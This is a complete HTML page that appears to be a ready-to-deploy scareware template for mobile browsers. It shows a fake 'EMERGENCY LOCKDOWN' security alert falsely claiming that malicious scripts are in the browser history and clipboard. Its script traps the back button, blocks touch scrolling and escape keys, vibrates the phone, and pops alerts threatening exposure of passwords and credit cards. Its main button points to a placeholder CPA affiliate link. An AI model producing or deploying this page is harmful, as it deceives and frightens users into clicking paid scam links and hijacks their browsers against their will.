<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Security Alert</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: white;
            height: 100vh;
            height: -webkit-fill-available;
            overflow: hidden;
            touch-action: none;
            position: fixed;
            width: 100%;
            -webkit-overflow-scrolling: touch;
        }
        
        .alert-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            height: -webkit-fill-available;
            background: radial-gradient(ellipse at center, #450000 0%, #000 80%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 20px;
        }
        
        .alert-box {
            background: linear-gradient(145deg, #6a0000 0%, #300000 100%);
            border: 2px solid #ff3b30;
            border-radius: 18px;
            padding: 25px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 0 40px rgba(255, 59, 48, 0.6);
            animation: pulse 2s infinite ease-in-out;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 20px rgba(255, 59, 48, 0.6); }
            50% { box-shadow: 0 0 50px rgba(255, 59, 48, 0.9); }
            100% { box-shadow: 0 0 20px rgba(255, 59, 48, 0.6); }
        }
        
        .alert-icon {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 8px rgba(255, 59, 48, 0.8));
        }
        
        h1 {
            font-size: 26px;
            margin-bottom: 18px;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.6);
            font-weight: 700;
        }
        
        p {
            margin-bottom: 22px;
            font-size: 17px;
            line-height: 1.5;
            color: #ffb3b3;
        }
        
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 14px;
            margin-top: 25px;
        }
        
        .btn {
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.15s;
            -webkit-appearance: none;
        }
        
        .btn-install {
            background: linear-gradient(to bottom, #ff3b30, #b20000);
            color: white;
            box-shadow: 0 5px 0 #800000;
            text-shadow: 0 1px 1px rgba(0,0,0,0.4);
        }
        
        .btn-install:active {
            transform: translateY(3px);
            box-shadow: 0 2px 0 #800000;
        }
        
        .btn-cancel {
            background: #1c1c1e;
            color: #ff9e9e;
            border: 1px solid #ff3b30;
        }
        
        .btn-cancel:active {
            background: #2c2c2e;
        }
    </style>
</head>
<body>
    <div class="alert-container" id="alertContainer">
        <div class="alert-box">
            <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
            <h1>‚ö†Ô∏è EMERGENCY LOCKDOWN ‚ö†Ô∏è</h1>
            <p><strong>BACK BUTTON BLOCKED!</strong></p>
            <p>Malicious scripts detected in:</p>
            <p>‚Ä¢ Safari/Chrome history<br>‚Ä¢ Keyboard cache<br>‚Ä¢ Clipboard data</p>
            <div class="btn-group">
                <button class="btn btn-install" onclick="window.location.href='YOUR_CPA_LINK'">
                    üîí ENABLE PROTECTION NOW
                </button>
                <button class="btn btn-cancel" id="cancelBtn">
                    TRY TO LEAVE (UNSAFE)
                </button>
            </div>
        </div>
    </div>

    <script>
        // IMMEDIATE BACK BUTTON TRAPPING
        let attempts = 0;
        const maxAttempts = 10;
        
        // 1. BLOCK INITIAL BACK BUTTON (works on iOS/Android)
        history.pushState(null, null, location.href);
        
        // 2. INSTANT POPUP ON FIRST BACK PRESS
        window.onpopstate = function() {
            // Immediately push new history state
            history.pushState(null, null, location.href);
            
            // Trigger full-screen alert
            showEmergencyAlert();
            
            // Count as attempt
            attempts++;
            if(attempts >= maxAttempts) {
                window.location.href = "about:blank";
            }
        };
        
        // 3. EMERGENCY ALERT FUNCTION
        function showEmergencyAlert() {
            // Make phone vibrate if possible
            if (navigator.vibrate || navigator.webkitVibrate) {
                (navigator.vibrate || navigator.webkitVibrate)([500, 200, 500]);
            }
            
            // iOS-compatible shake
            const alertBox = document.querySelector('.alert-box');
            alertBox.style.transform = 'translateX(-15px)';
            setTimeout(() => { alertBox.style.transform = 'translateX(15px)'; }, 50);
            setTimeout(() => { alertBox.style.transform = 'translateX(-10px)'; }, 100);
            setTimeout(() => { alertBox.style.transform = 'translateX(10px)'; }, 150);
            setTimeout(() => { alertBox.style.transform = 'translateX(0)'; }, 200);
            
            // Show urgent alert
            alert("üö® STOP! üö®\n\nLeaving now will expose your:\n‚Ä¢ Saved passwords\n‚Ä¢ Credit cards\n‚Ä¢ Private messages");
        }
        
        // 4. CANCEL BUTTON ALSO TRIGGERS
        document.getElementById('cancelBtn').addEventListener('click', function() {
            showEmergencyAlert();
            attempts++;
            if(attempts >= maxAttempts) {
                window.location.href = "about:blank";
            }
        });
        
        // 5. PREVENT ALL ESCAPE METHODS
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' || e.key === 'Escape') {
                e.preventDefault();
                showEmergencyAlert();
            }
        });
    </script>
</body>
</html>
